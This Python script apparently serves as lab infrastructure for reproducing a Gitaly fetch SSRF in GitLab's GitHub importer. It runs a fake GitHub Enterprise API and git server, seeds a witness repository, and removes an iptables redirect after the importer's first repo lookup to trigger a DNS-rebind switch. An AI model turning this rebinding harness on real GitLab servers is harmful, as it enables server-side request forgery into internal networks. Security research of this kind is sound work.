#!/usr/bin/env python3
"""Fake GHE API + git-http-backend on :18080 inside the GitLab netns."""

from __future__ import annotations

import json
import os
import subprocess
import threading
import time
from dataclasses import dataclass, field
from http.client import HTTPMessage
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse

SEED_DIR = Path("/tmp/seed-repo")
REPO_ID = 4242
OWNER_LOGIN = "org"
REPO_NAME = "repo"


@dataclass(frozen=True)
class CatcherConfig:
    witness: str
    git_root: Path
    shared_dir: Path
    log_dir: Path
    bind_host: str
    bind_port: int
    public_ip: str
    ghe_name: str

    @classmethod
    def from_env(cls) -> CatcherConfig:
        return cls(
            witness=os.environ.get("WITNESS", "GITLAB-GITALY-FETCH-SSRF-WITNESS"),
            git_root=Path(os.environ.get("GIT_ROOT", "/git")),
            shared_dir=Path(os.environ.get("SHARED_DIR", "/shared")),
            log_dir=Path(os.environ.get("LOG_DIR", "/logs")),
            bind_host=os.environ.get("BIND_HOST", "0.0.0.0"),
            bind_port=int(os.environ.get("BIND_PORT", "18080")),
            public_ip=os.environ.get("PUBLIC_IP", "1.1.1.1"),
            ghe_name=os.environ.get("GHE_NAME", "ghe.lab"),
        )

    @property
    def flip_path(self) -> Path:
        return self.shared_dir / "rebind_flip"

    @property
    def log_path(self) -> Path:
        return self.log_dir / "catcher.log"

    @property
    def bare(self) -> Path:
        return self.git_root / OWNER_LOGIN / f"{REPO_NAME}.git"

    @property
    def clone_url(self) -> str:
        return f"http://{self.ghe_name}:{self.bind_port}/{OWNER_LOGIN}/{REPO_NAME}.git"

    @property
    def api_base(self) -> str:
        return f"http://{self.ghe_name}:{self.bind_port}/api/v3"


@dataclass
class CatcherState:
    repo_exact_gets: int = 0
    rebind_armed: bool = False
    lock: threading.Lock = field(default_factory=threading.Lock)


def log(cfg: CatcherConfig, msg: str) -> None:
    line = f"{time.strftime('%Y-%m-%dT%H:%M:%S')} {msg}"
    print(line, flush=True)
    cfg.log_dir.mkdir(parents=True, exist_ok=True)
    with cfg.log_path.open("a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def seed_repo(cfg: CatcherConfig) -> None:
    (cfg.git_root / OWNER_LOGIN).mkdir(parents=True, exist_ok=True)
    if cfg.bare.is_dir():
        log(cfg, f"git-seed exists {cfg.bare}")
        return
    seed = SEED_DIR
    seed.mkdir(parents=True, exist_ok=True)
    env = os.environ.copy()
    env["HOME"] = "/tmp"
    cmds: list[list[str]] = [
        ["git", "init", str(seed)],
        ["git", "-C", str(seed), "config", "user.email", "lab@localhost.invalid"],
        ["git", "-C", str(seed), "config", "user.name", "Lab"],
    ]
    for cmd in cmds:
        subprocess.run(cmd, check=True, env=env, capture_output=True)
    (seed / "WITNESS").write_text(cfg.witness + "\n", encoding="utf-8")
    subprocess.run(["git", "-C", str(seed), "add", "WITNESS"], check=True, env=env, capture_output=True)
    subprocess.run(["git", "-C", str(seed), "commit", "-m", "witness"], check=True, env=env, capture_output=True)
    subprocess.run(["git", "-C", str(seed), "branch", "-M", "master"], check=True, env=env, capture_output=True)
    subprocess.run(["git", "clone", "--bare", str(seed), str(cfg.bare)], check=True, env=env, capture_output=True)
    subprocess.run(
        ["git", "--git-dir", str(cfg.bare), "update-server-info"],
        check=True,
        env=env,
        capture_output=True,
    )
    log(cfg, f"git-seeded {cfg.bare} witness={cfg.witness}")


def iptables_redirect(cfg: CatcherConfig, add: bool) -> None:
    args = [
        "iptables",
        "-t",
        "nat",
        "-A" if add else "-D",
        "OUTPUT",
        "-p",
        "tcp",
        "-d",
        cfg.public_ip,
        "--dport",
        str(cfg.bind_port),
        "-j",
        "REDIRECT",
        "--to-ports",
        str(cfg.bind_port),
    ]
    proc = subprocess.run(args, capture_output=True, text=True)
    log(
        cfg,
        f"iptables {'add' if add else 'del'} rc={proc.returncode} err={(proc.stderr or '').strip()[:200]}",
    )


def arm_rebind(cfg: CatcherConfig, state: CatcherState, reason: str) -> None:
    with state.lock:
        if state.rebind_armed:
            return
        state.rebind_armed = True
        cfg.shared_dir.mkdir(parents=True, exist_ok=True)
        cfg.flip_path.write_text(reason + "\n", encoding="utf-8")
        iptables_redirect(cfg, False)
        log(cfg, f"IOC rebind-armed reason={reason}")


def repo_payload(cfg: CatcherConfig) -> dict[str, object]:
    owner: dict[str, object] = {
        "login": OWNER_LOGIN,
        "id": 7,
        "type": "Organization",
        "site_admin": False,
    }
    return {
        "id": REPO_ID,
        "name": REPO_NAME,
        "full_name": f"{OWNER_LOGIN}/{REPO_NAME}",
        "private": False,
        "html_url": f"http://{cfg.ghe_name}:{cfg.bind_port}/{OWNER_LOGIN}/{REPO_NAME}",
        "description": "gitaly fetch ssrf lab",
        "fork": False,
        "url": f"{cfg.api_base}/repos/{OWNER_LOGIN}/{REPO_NAME}",
        "clone_url": cfg.clone_url,
        "git_url": f"git://{cfg.ghe_name}:{cfg.bind_port}/{OWNER_LOGIN}/{REPO_NAME}.git",
        "ssh_url": f"git@{cfg.ghe_name}:{OWNER_LOGIN}/{REPO_NAME}.git",
        "svn_url": cfg.clone_url,
        "default_branch": "master",
        "master_branch": "master",
        "has_issues": False,
        "has_wiki": False,
        "has_pages": False,
        "has_downloads": False,
        "archived": False,
        "disabled": False,
        "size": 1,
        "stargazers_count": 0,
        "watchers_count": 0,
        "language": None,
        "forks_count": 0,
        "open_issues_count": 0,
        "owner": owner,
        "organization": owner,
        "permissions": {"admin": True, "push": True, "pull": True},
    }


def user_payload() -> dict[str, object]:
    return {"login": "lab", "id": 1, "type": "User", "site_admin": False}


def rate_payload() -> dict[str, object]:
    reset = int(time.time()) + 3600
    return {
        "resources": {
            "core": {"limit": 5000, "remaining": 4999, "reset": reset},
            "search": {"limit": 30, "remaining": 29, "reset": reset},
            "graphql": {"limit": 5000, "remaining": 4999, "reset": reset},
        },
        "rate": {"limit": 5000, "remaining": 4999, "reset": reset},
    }


def parse_cgi(output: bytes) -> tuple[int, list[tuple[str, str]], bytes]:
    sep = b"\r\n\r\n" if b"\r\n\r\n" in output else b"\n\n"
    header_blob, _, body = output.partition(sep)
    status = 200
    headers: list[tuple[str, str]] = []
    for raw in header_blob.decode("latin1", "replace").splitlines():
        if ":" not in raw:
            continue
        key, val = raw.split(":", 1)
        key, val = key.strip(), val.strip()
        if key.lower() == "status":
            try:
                status = int(val.split()[0])
            except ValueError:
                status = 200
        else:
            headers.append((key, val))
    return status, headers, body


def git_backend(
    cfg: CatcherConfig,
    method: str,
    path: str,
    query: str,
    headers: HTTPMessage,
    body: bytes,
) -> tuple[int, list[tuple[str, str]], bytes]:
    env = os.environ.copy()
    env.update(
        {
            "GIT_PROJECT_ROOT": str(cfg.git_root),
            "GIT_HTTP_EXPORT_ALL": "1",
            "REQUEST_METHOD": method,
            "PATH_INFO": path,
            "QUERY_STRING": query,
            "REMOTE_USER": "git",
            "REMOTE_ADDR": "127.0.0.1",
            "CONTENT_TYPE": headers.get("Content-Type", "application/x-git-upload-pack-request"),
            "CONTENT_LENGTH": str(len(body)),
            "HOME": "/tmp",
            "GIT_PROTOCOL": headers.get("Git-Protocol", ""),
        }
    )
    proc = subprocess.run(
        ["git", "http-backend"],
        input=body,
        capture_output=True,
        env=env,
        check=False,
    )
    if proc.returncode != 0:
        err = (proc.stderr or b"").decode("utf-8", "replace")[:400]
        log(cfg, f"git-http-backend rc={proc.returncode} err={err}")
        return 500, [("Content-Type", "text/plain")], b"git-http-backend failed\n"
    if proc.stderr:
        log(cfg, f"git-http-backend-stderr {proc.stderr.decode('utf-8', 'replace')[:300]}")
    return parse_cgi(proc.stdout)


def normalize_api_path(path: str) -> str:
    if path.startswith("/api/v3"):
        return path[len("/api/v3") :] or "/"
    return path


def is_git_path(path: str) -> bool:
    return (
        f"/{OWNER_LOGIN}/{REPO_NAME}.git" in path
        or path.endswith(".git")
        or "/git-upload-pack" in path
        or path.endswith("/info/refs")
    )


def make_handler(cfg: CatcherConfig, state: CatcherState) -> type[BaseHTTPRequestHandler]:
    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, fmt: str, *args: object) -> None:
            return

        def _read_body(self) -> bytes:
            length = int(self.headers.get("Content-Length") or 0)
            return self.rfile.read(length) if length else b""

        def _send(self, status: int, headers: list[tuple[str, str]], body: bytes) -> None:
            if self.command == "HEAD":
                body = b""
            self.send_response(status)
            have_len = False
            for key, val in headers:
                if key.lower() == "status":
                    continue
                if key.lower() == "content-length":
                    have_len = True
                self.send_header(key, val)
            if not have_len:
                self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)

        def _json(self, payload: object, status: int = 200) -> None:
            raw = json.dumps(payload).encode("utf-8")
            headers = [
                ("Content-Type", "application/json"),
                ("X-RateLimit-Limit", "5000"),
                ("X-RateLimit-Remaining", "4999"),
                ("X-RateLimit-Reset", str(int(time.time()) + 3600)),
                ("X-GitHub-Media-Type", "github.v3; format=json"),
            ]
            self._send(status, headers, raw)

        def _handle(self) -> None:
            parsed = urlparse(self.path)
            path = parsed.path
            ua = self.headers.get("User-Agent", "")
            host = self.headers.get("Host", "")
            client = self.client_address[0] if self.client_address else "?"
            dest = self.headers.get("X-Forwarded-For", "")
            log(
                cfg,
                f"{self.command} {path} host={host} ua={ua!r} client={client} dest={dest} "
                f"flip={int(cfg.flip_path.exists())}",
            )
            if is_git_path(path) and not path.startswith("/api/"):
                body = self._read_body()
                if "git-upload-pack" in path or "info/refs" in path:
                    log(cfg, f"IOC git-http path={path} ua={ua!r} host={host} client={client}")
                status, headers, out = git_backend(
                    cfg, self.command, path, parsed.query, self.headers, body
                )
                self._send(status, headers, out)
                return

            api = normalize_api_path(path).rstrip("/") or "/"
            if self.command == "POST" and api.endswith("git-upload-pack"):
                body = self._read_body()
                status, headers, out = git_backend(
                    cfg, self.command, path, parsed.query, self.headers, body
                )
                self._send(status, headers, out)
                return

            self._read_body()
            if api in ("/user", "/users/lab"):
                self._json(user_payload())
                return
            if api == "/rate_limit":
                self._json(rate_payload())
                return
            if api in (f"/repositories/{REPO_ID}", f"/repos/{OWNER_LOGIN}/{REPO_NAME}"):
                self._json(repo_payload(cfg))
                if api == f"/repos/{OWNER_LOGIN}/{REPO_NAME}":
                    with state.lock:
                        state.repo_exact_gets += 1
                        n = state.repo_exact_gets
                    log(cfg, f"IOC github-repo-get n={n}")
                    if n >= 1:
                        # Worker RepositoryImporter#client_repository is the first
                        # GET /repos/org/repo (initial POST uses /repositories/:id).
                        arm_rebind(cfg, state, f"repos-org-repo-get-{n}")
                return
            if api.startswith(f"/repos/{OWNER_LOGIN}/{REPO_NAME}/"):
                rest = api[len(f"/repos/{OWNER_LOGIN}/{REPO_NAME}/") :]
                if rest == "branches":
                    self._json(
                        [
                            {
                                "name": "master",
                                "commit": {
                                    "sha": "0" * 40,
                                    "url": f"{cfg.api_base}/repos/{OWNER_LOGIN}/{REPO_NAME}/commits/master",
                                },
                                "protected": False,
                            }
                        ]
                    )
                    return
                if rest.startswith("git/"):
                    self._json([])
                    return
                self._json([])
                return
            if api.startswith("/repos/") or api.startswith("/repositories/"):
                self._json([])
                return
            if api == "/":
                self._json({"ok": True, "witness": cfg.witness})
                return
            self._json([])

        def do_GET(self) -> None:
            try:
                self._handle()
            except Exception as exc:
                log(cfg, f"handler-error GET {exc}")
                try:
                    self._send(500, [("Content-Type", "text/plain")], b"error\n")
                except OSError:
                    pass

        def do_POST(self) -> None:
            try:
                self._handle()
            except Exception as exc:
                log(cfg, f"handler-error POST {exc}")
                try:
                    self._send(500, [("Content-Type", "text/plain")], b"error\n")
                except OSError:
                    pass

        def do_HEAD(self) -> None:
            self.do_GET()

        def do_PATCH(self) -> None:
            self._read_body()
            self._json([])

    return Handler


def main() -> int:
    cfg = CatcherConfig.from_env()
    state = CatcherState()
    cfg.shared_dir.mkdir(parents=True, exist_ok=True)
    cfg.log_dir.mkdir(parents=True, exist_ok=True)
    if cfg.flip_path.exists():
        cfg.flip_path.unlink()
    seed_repo(cfg)
    iptables_redirect(cfg, True)
    log(cfg, f"catcher-listen {cfg.bind_host}:{cfg.bind_port} clone={cfg.clone_url}")
    httpd = ThreadingHTTPServer((cfg.bind_host, cfg.bind_port), make_handler(cfg, state))
    httpd.allow_reuse_address = True
    httpd.serve_forever()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
